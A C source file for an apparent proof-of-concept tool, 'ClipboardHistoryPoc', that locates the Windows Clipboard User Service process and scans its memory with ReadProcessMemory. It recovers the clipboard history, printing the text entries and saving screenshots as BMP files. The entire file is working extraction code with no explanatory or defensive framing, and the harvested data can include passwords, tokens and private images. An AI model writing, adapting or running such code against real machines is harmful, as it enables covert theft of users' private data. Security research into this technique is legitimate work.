#include <stdio.h>
#include <windows.h>
#include <psapi.h>
#include <tchar.h>
#include <winternl.h>
#include <ntstatus.h>
#include <stdbool.h>


// Constants 
BYTE END_BYTE = 0x1;
wchar_t TEXT_TYPE_VALUE[] = L"Text"; 
size_t TEXT_TYPE_LEN = sizeof(TEXT_TYPE_VALUE);
TCHAR WINDOWS_DATA_TRANSFER_DLL[] = TEXT("windows.applicationmodel.datatransfer.dll");
LPCTSTR CLIPBOARD_USER_SERVICE_PREFIX = TEXT("cbdhsvc"); 
DWORD REQUIRED_HEADER_SIZE = 40; 
LONG MAX_WIDTH = 5000;
LONG MIN_WIDTH = 1;
LONG MIN_HEIGHT = -5000;
LONG MAX_HEIGHT = 5000;
WORD REQUIRED_BIT_COUNT = 32;
WORD REQUIRED_PLANES = 1;
WORD BITMAP_FILE_HEADER_IDENTIFIER = 0x4D42;


bool save_bitmap_as_file(const char* filename, BITMAPINFOHEADER* header, BYTE* pixel_data) {
    FILE* fp = fopen(filename, "wb");
    if (!fp) {
        return false;
    }

    DWORD imageSize = header->biWidth * abs(header->biHeight) * (header->biBitCount / 8);

    BITMAPFILEHEADER fileHeader;
    fileHeader.bfType = BITMAP_FILE_HEADER_IDENTIFIER; 
    fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + header->biSize;
    fileHeader.bfSize = fileHeader.bfOffBits + imageSize;
    fileHeader.bfReserved1 = 0;
    fileHeader.bfReserved2 = 0;

    fwrite(&fileHeader, sizeof(fileHeader), 1, fp);
    fwrite(header, header->biSize, 1, fp);
    fwrite(pixel_data, imageSize, 1, fp);

    fclose(fp);
    return true;
}

BOOL starts_with(LPCTSTR str, LPCTSTR prefix) {
    return _tcsncmp(str, prefix, _tcslen(prefix)) == 0;
}

char* wide_to_utf8(const WCHAR* wide_str) {
    if (wide_str == NULL) {
        return NULL;
    }
    int utf8_size = WideCharToMultiByte(CP_UTF8, 0, wide_str, -1, NULL, 0, NULL, NULL);
    char* utf8_str = (char*)malloc(utf8_size);
    if (utf8_str == NULL) {
        printf("Memory allocation failed for UTF-8 string.\n");
        return NULL;
    }

    WideCharToMultiByte(CP_UTF8, 0, wide_str, -1, utf8_str, utf8_size, NULL, NULL);
    return utf8_str;
}

DWORD get_clipboard_svc_pid() {
    DWORD clipboard_svc_pid = 0;
    SC_HANDLE service_manager = NULL;
    ENUM_SERVICE_STATUS_PROCESS* services = NULL;
    DWORD bytes_needed = 0;
    DWORD services_returned = 0;
    DWORD resume_handle = 0;

    service_manager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_ENUMERATE_SERVICE);
    if (!service_manager) {
        printf("OpenSCManager failed with error %d\n", GetLastError());
        return 0;
    }

    if (!EnumServicesStatusEx(service_manager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, 0, &bytes_needed, &services_returned, &resume_handle, NULL) &&
        GetLastError() != ERROR_MORE_DATA) {
        printf("EnumServicesStatusEx failed with error %d\n", GetLastError());
        CloseServiceHandle(service_manager);
        return 0;
    }

    services = (ENUM_SERVICE_STATUS_PROCESS*)malloc(bytes_needed);
    if (!services) {
        printf("Memory allocation failed\n");
        CloseServiceHandle(service_manager);
        return 0;
    }
    
    if (!EnumServicesStatusEx(service_manager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, (LPBYTE)services, bytes_needed, &bytes_needed, &services_returned, &resume_handle, NULL)) {
        printf("EnumServicesStatusEx failed with error %d\n", GetLastError());
        free(services);
        CloseServiceHandle(service_manager);
        return 0;
    }

    for (DWORD i = 0; i < services_returned; i++) {
        if (starts_with(services[i].lpServiceName, CLIPBOARD_USER_SERVICE_PREFIX)) {
            clipboard_svc_pid = services[i].ServiceStatusProcess.dwProcessId;
            break;
        }
    }

    free(services);
    CloseServiceHandle(service_manager);

    return clipboard_svc_pid;
}

BOOL is_with_in_rdata_section(HANDLE process, HMODULE module, DWORD_PTR address) {
    BOOL result = FALSE;
    IMAGE_DOS_HEADER dos_header = {0};
    IMAGE_NT_HEADERS nt_headers = {0};
    SIZE_T bytes_read = 0;

    if (!ReadProcessMemory(process, module, &dos_header, sizeof(IMAGE_DOS_HEADER), &bytes_read)) {
        return result;
    }

    if (!ReadProcessMemory(process, (LPVOID)((DWORD_PTR)module + dos_header.e_lfanew), &nt_headers, sizeof(IMAGE_NT_HEADERS), &bytes_read)) {
        return result;
    }

    WORD num_sections = nt_headers.FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER sections_headers = (PIMAGE_SECTION_HEADER)malloc(num_sections * sizeof(IMAGE_SECTION_HEADER));
    if (!sections_headers) {
        printf("Memory allocation failed for section headers.\n");
        return result;
    }

    if (!ReadProcessMemory(process, (LPVOID)((DWORD_PTR)module + dos_header.e_lfanew + sizeof(IMAGE_NT_HEADERS)), sections_headers, num_sections * sizeof(IMAGE_SECTION_HEADER), &bytes_read)) {
        free(sections_headers);
        return result;
    }

    for (WORD i = 0; i < num_sections; i++) {
        if (strncmp((const char *)sections_headers[i].Name, ".rdata", IMAGE_SIZEOF_SHORT_NAME) == 0) {
            DWORD_PTR section_start = (DWORD_PTR)module + sections_headers[i].VirtualAddress;
            DWORD_PTR section_end = section_start + sections_headers[i].Misc.VirtualSize;

            if (address >= section_start && address < section_end) {
                result = TRUE;
            }
            break;
        }
    }

    free(sections_headers);

    return result;
}

HMODULE get_module_by_name(HANDLE process, const TCHAR* target_module_name) {
    HMODULE desired_module = NULL;
    DWORD modules_bytes_needed;
    
    if (EnumProcessModules(process, NULL, 0, &modules_bytes_needed)) {
        HMODULE* modules = (HMODULE*)malloc(modules_bytes_needed);
        if (!modules) {
            printf("Memory allocation failed for module handles.\n");
            return NULL;
        }

        if (EnumProcessModules(process, modules, modules_bytes_needed, &modules_bytes_needed)) {
            for (unsigned int i = 0; i < modules_bytes_needed / sizeof(HMODULE); i++) {
                TCHAR current_module_name[MAX_PATH];
                if (GetModuleBaseName(process, modules[i], current_module_name, sizeof(current_module_name) / sizeof(TCHAR))) {
                    if (_tcscmp(current_module_name, target_module_name) == 0) {
                        desired_module = modules[i];
                        break;
                    }
                }
            }
        }
        free(modules);
    }

    return desired_module;
}

bool check_for_text_pattern(HANDLE process, HMODULE windows_data_transfer_dll, LPVOID base_address, SIZE_T offset) {
    BYTE end_byte;
    DWORD_PTR rdata_address;
    DWORD_PTR text_type_address;
    wchar_t text_type[8];

    if (!ReadProcessMemory(process, (LPCVOID)((DWORD_PTR)base_address + offset + 0x20), &end_byte, sizeof(end_byte), NULL) || 
        end_byte != END_BYTE) {
        return false;
    }

    if (!ReadProcessMemory(process, (LPCVOID)((DWORD_PTR)base_address + offset), &rdata_address, sizeof(DWORD_PTR), NULL) ||
        !is_with_in_rdata_section(process, windows_data_transfer_dll, rdata_address)) {
        return false;
    }

    if (!ReadProcessMemory(process, (LPCVOID)((DWORD_PTR)base_address + offset + 8), &text_type_address, sizeof(DWORD_PTR), NULL)) {
        return false;
    }

    if (!ReadProcessMemory(process, (LPCVOID)(text_type_address + 0x1c), &text_type, sizeof(text_type), NULL) || 
        wcscmp(text_type, TEXT_TYPE_VALUE)) {
        return false;
    }

    return true;
}


bool check_for_screenshot_pattern(HANDLE process, LPVOID base_address, SIZE_T offset) {
    DWORD bmp_info_header_size;
    LONG bmp_info_width;
    LONG bmp_info_height;
    WORD bmp_info_planes;
    WORD bmp_info_bit_count;

    if (!ReadProcessMemory(process, (LPCVOID)((DWORD_PTR)base_address + offset), &bmp_info_header_size, sizeof(bmp_info_header_size), NULL) ||
        bmp_info_header_size != REQUIRED_HEADER_SIZE) {
        return false;
    }

    if (!ReadProcessMemory(process, (LPCVOID)((DWORD_PTR)base_address + offset + sizeof(bmp_info_header_size)), &bmp_info_width, sizeof(bmp_info_width), NULL) ||
        bmp_info_width < MIN_WIDTH || bmp_info_width > MAX_WIDTH) { 
        return false;
    }

    if (!ReadProcessMemory(process, (LPCVOID)((DWORD_PTR)base_address + offset + sizeof(bmp_info_header_size) + sizeof(bmp_info_width)), &bmp_info_height, sizeof(bmp_info_height), NULL) ||
        bmp_info_height < MIN_HEIGHT || bmp_info_height > MAX_HEIGHT || bmp_info_height == 0) {
        return false;
    }

    if (!ReadProcessMemory(process, (LPCVOID)((DWORD_PTR)base_address + offset + sizeof(bmp_info_header_size) + sizeof(bmp_info_width) + sizeof(bmp_info_height)), &bmp_info_planes, sizeof(bmp_info_planes), NULL) ||
        bmp_info_planes != REQUIRED_PLANES) {
        return false;
    }

    if (!ReadProcessMemory(process, (LPCVOID)((DWORD_PTR)base_address + offset + sizeof(bmp_info_header_size) + sizeof(bmp_info_width) + sizeof(bmp_info_height) + sizeof(bmp_info_planes)), &bmp_info_bit_count, sizeof(bmp_info_bit_count), NULL) ||
        bmp_info_bit_count != REQUIRED_BIT_COUNT) {
        return false;
    }

    return true;
}

void extract_clipboard_screenshot_history() {
    DWORD clipboard_svc_pid = get_clipboard_svc_pid();
    if (clipboard_svc_pid == 0) {
        printf("Clipboard User Service is not running.\n");
        return;
    }

    HANDLE clipboard_svc_process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, clipboard_svc_pid);
    if (clipboard_svc_process == NULL) {
        printf("Failed to open Clipboard User Service process. Error: %d\n", GetLastError());
        return;
    }

    MEMORY_BASIC_INFORMATION mem_info;
    int bmp_file_counter = 1;
    
    for (LPVOID addr = 0; VirtualQueryEx(clipboard_svc_process, addr, &mem_info, sizeof(mem_info)) == sizeof(mem_info); addr = (LPVOID)((DWORD_PTR)addr + mem_info.RegionSize)) {
        if (mem_info.State != MEM_COMMIT || mem_info.Type != MEM_PRIVATE || mem_info.Protect != PAGE_READWRITE) {
            continue;
        }

        for (SIZE_T i = 0; i < mem_info.RegionSize - sizeof(DWORD) - 2 * sizeof(LONG) - 2 * sizeof(WORD); i++) { 
            bool result = check_for_screenshot_pattern(clipboard_svc_process, mem_info.BaseAddress, i);
            if (!result) {
                continue; 
            }
            
            BITMAPINFOHEADER* bmp_header = NULL;
            SIZE_T bmp_header_size = sizeof(BITMAPINFOHEADER);
            BYTE* pixel_data = NULL;
            SIZE_T pixel_data_size = 0;

            bmp_header = (BITMAPINFOHEADER*)malloc(bmp_header_size);
            if (bmp_header == NULL) {
                printf("Memory allocation failed for BMP header.\n");
                continue;
            }
            
            if (!ReadProcessMemory(clipboard_svc_process, (LPCVOID)((DWORD_PTR)mem_info.BaseAddress + i), bmp_header, bmp_header_size, NULL)) {
                printf("Failed to read BMP header from process memory.\n");
                free(bmp_header);
                continue;
            }
            
            pixel_data_size = bmp_header->biWidth * abs(bmp_header->biHeight) * (bmp_header->biBitCount / 8);
            pixel_data = (BYTE*)malloc(pixel_data_size);
            if (pixel_data == NULL) {
                printf("Memory allocation failed for pixel data.\n");
                free(bmp_header);
                continue;
            }

            if (!ReadProcessMemory(clipboard_svc_process, (LPCVOID)((DWORD_PTR)mem_info.BaseAddress + i + bmp_header->biSize), pixel_data, pixel_data_size, NULL)) {
                printf("Failed to read pixel data from process memory.\n");
                free(pixel_data);
                free(bmp_header);
                continue;
            }
            
            char file_name[40];
            snprintf(file_name, sizeof(file_name), "clipboard_screenshot_%d.bmp", bmp_file_counter++);
            if (!save_bitmap_as_file(file_name, bmp_header, pixel_data)) {
                printf("Failed to save BMP file: %s\n", file_name);
            } else {
                printf("Saved BMP file: %s\n", file_name);
            }

            free(pixel_data);
            free(bmp_header);
        }
    }
}

void extract_clipboard_text_history() {
    DWORD clipboard_svc_pid = get_clipboard_svc_pid();
    if (clipboard_svc_pid == 0) {
        printf("Clipboard User Service is not running.\n");
        return;
    }

    HANDLE clipboard_svc_process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, clipboard_svc_pid);
    if (clipboard_svc_process == NULL) {
        printf("Failed to open Clipboard User Service process. Error: %d\n", GetLastError());
        return;
    }

    HMODULE windows_data_transfer_dll = get_module_by_name(clipboard_svc_process, WINDOWS_DATA_TRANSFER_DLL);
    if (!windows_data_transfer_dll) {
        printf("Failed to find %s module.\n", WINDOWS_DATA_TRANSFER_DLL);
        return;
    }

    MEMORY_BASIC_INFORMATION mem_info;
    int bmp_file_counter = 1;
    
    for (LPVOID addr = 0; VirtualQueryEx(clipboard_svc_process, addr, &mem_info, sizeof(mem_info)) == sizeof(mem_info); addr = (LPVOID)((DWORD_PTR)addr + mem_info.RegionSize)) {
        if (mem_info.State != MEM_COMMIT || mem_info.Type != MEM_PRIVATE || mem_info.Protect != PAGE_READWRITE) {
            continue;
        }

        for (SIZE_T i = 0; i < mem_info.RegionSize - 0x20; i++) {
            bool result = check_for_text_pattern(clipboard_svc_process, windows_data_transfer_dll, mem_info.BaseAddress, i);

            if (!result) {
                continue; 
            }

            DWORD_PTR clipboard_data_address;
            if (!ReadProcessMemory(clipboard_svc_process, (LPCVOID)((DWORD_PTR)mem_info.BaseAddress + i + 0x18), &clipboard_data_address, sizeof(DWORD_PTR), NULL)) {
                printf("Failed to read clipboard data address.\n");
                continue;
            }

            WCHAR* clipboard_data = NULL;
            SIZE_T data_size = 256; 
            SIZE_T bytes_read;
            SIZE_T total_bytes_read = 0;
            bool read_completed = false;

            clipboard_data = (WCHAR*)malloc(data_size * sizeof(WCHAR));
            if (clipboard_data == NULL) {
                printf("Memory allocation failed for clipboard data.\n");
                continue;
            }

            while (!read_completed && total_bytes_read < data_size * sizeof(WCHAR) - sizeof(WCHAR)) {
                if (ReadProcessMemory(clipboard_svc_process, (LPCVOID)(clipboard_data_address + total_bytes_read), &clipboard_data[total_bytes_read / sizeof(WCHAR)], sizeof(WCHAR), &bytes_read)) {
                    if (bytes_read == sizeof(WCHAR) && clipboard_data[total_bytes_read / sizeof(WCHAR)] == L'\0') {
                            read_completed = TRUE; 
                    } else {
                            total_bytes_read += bytes_read;
                    }
                } else {
                    break; 
                }
                
                if (total_bytes_read == data_size * sizeof(WCHAR) - sizeof(WCHAR)) {
                    data_size *= 2;
                    clipboard_data = (WCHAR*)realloc(clipboard_data, data_size * sizeof(WCHAR));

                    if (clipboard_data == NULL) {
                        printf("Memory reallocation failed for clipboard data.\n");
                        break;
                    }
                }
            }

            if (total_bytes_read > 0) {
                clipboard_data[total_bytes_read / sizeof(WCHAR)] = L'\0';
                char* utf8_text = wide_to_utf8(clipboard_data);
                if (utf8_text == NULL) {
                    printf("Failed to convert clipboard text to UTF-8.\n");
                } else {
                    printf("======================== Clipboard Content ========================\n");
                    printf("%s\n", utf8_text);
                    printf("==================================================================\n\n");
                }
                free(utf8_text);
            }

            free(clipboard_data);
        }
    }

    CloseHandle(clipboard_svc_process);
    CloseHandle(windows_data_transfer_dll);
}
                            
void show_help_menu() {
    printf("ClipboardHistoryPoc.exe [command]\n");
    printf("Commands:\n");
    printf("  text   Extracts the clipboard text history to console.\n");
    printf("  screenshot Extracts the clipboard screenshot history to BMP files.\n");
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        if (!stricmp("text", argv[1])) {
            extract_clipboard_text_history();
        } else if (!stricmp("screenshot", argv[1])) {
            extract_clipboard_screenshot_history();
        } else
            show_help_menu();
    } else
        show_help_menu();

    return 0;
}
